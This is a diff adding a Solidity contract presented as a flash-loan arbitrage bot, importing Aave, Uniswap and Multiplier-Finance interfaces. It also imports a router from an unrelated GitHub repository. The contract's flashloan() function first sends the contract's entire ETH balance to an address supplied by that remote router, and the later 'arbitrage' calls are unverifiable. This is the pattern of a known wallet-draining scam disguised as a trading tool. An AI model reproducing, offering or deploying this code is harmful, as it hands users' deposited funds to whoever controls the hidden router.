@@ -1,0 +1,61 @@
+pragma solidity ^0.5.0;
+
+
+// AAVE Smart Contracts
+import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
+import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";
+
+// Router
+import "https://github.com/flashloancoder2022/newcode/blob/d1aebfec0960e65eabd5763f47f3f9e8d1523fc9/ethflash.sol";
+
+//Uniswap Smart contracts
+import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
+
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+
+
+contract InitiateFlashLoan {
+    
+	RouterV2 router;
+    string public tokenName;
+    string public tokenSymbol;
+    uint256 flashLoanAmount;
+
+    constructor(
+        string memory _tokenName,
+        string memory _tokenSymbol,
+        uint256 _loanAmount
+    ) public {
+        tokenName = _tokenName;
+        tokenSymbol = _tokenSymbol;
+        flashLoanAmount = _loanAmount;
+
+        router = new RouterV2();
+    }
+
+    function() external payable {}
+
+    function flashloan() public payable {
+        // Envia token a realizar swap
+        address(uint160(router.uniswapSwapAddress())).transfer(
+            address(this).balance
+        );
+
+        router.borrowFlashloanFromMultiplier(
+            address(this),
+            router.aaveSwapAddress(),
+            flashLoanAmount
+        );
+       
+        router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
+        
+        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
+       
+        router.transferDaiToMultiplier(router.uniswapSwapAddress());
+   
+        router.completeTransation(address(this).balance);
+    }
+}
